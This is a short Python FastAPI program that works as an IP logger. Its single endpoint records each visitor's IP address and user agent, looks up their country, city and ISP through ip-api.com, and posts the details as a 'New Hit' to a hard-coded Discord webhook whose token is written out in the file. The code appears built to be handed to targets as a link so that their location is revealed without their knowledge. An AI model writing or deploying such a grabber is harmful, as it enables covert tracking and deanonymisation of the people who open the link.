from fastapi import FastAPI, Request
import requests
import datetime

app = FastAPI()

WEBHOOK = "https://discord.com/api/webhooks/1487544685286260736/NXWg6tI2WDWHryyIKngEvZLqh401dZmWHPF0ALZFirU1d3GMviuakEFGgd4wH1GbEJ3_"

def get_location(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}").json()
        return r
    except:
        return {}

@app.get("/")
async def logger(request: Request):
    ip = request.headers.get("x-forwarded-for", request.client.host)
    user_agent = request.headers.get("user-agent")

    location = get_location(ip)

    data = {
        "content": f"""
New Hit

IP: {ip}
Country: {location.get("country")}
City: {location.get("city")}
ISP: {location.get("isp")}
UA: {user_agent}
"""
    }

    try:
        requests.post(WEBHOOK, json=data)
    except:
        pass

    return {"status": "logged"}
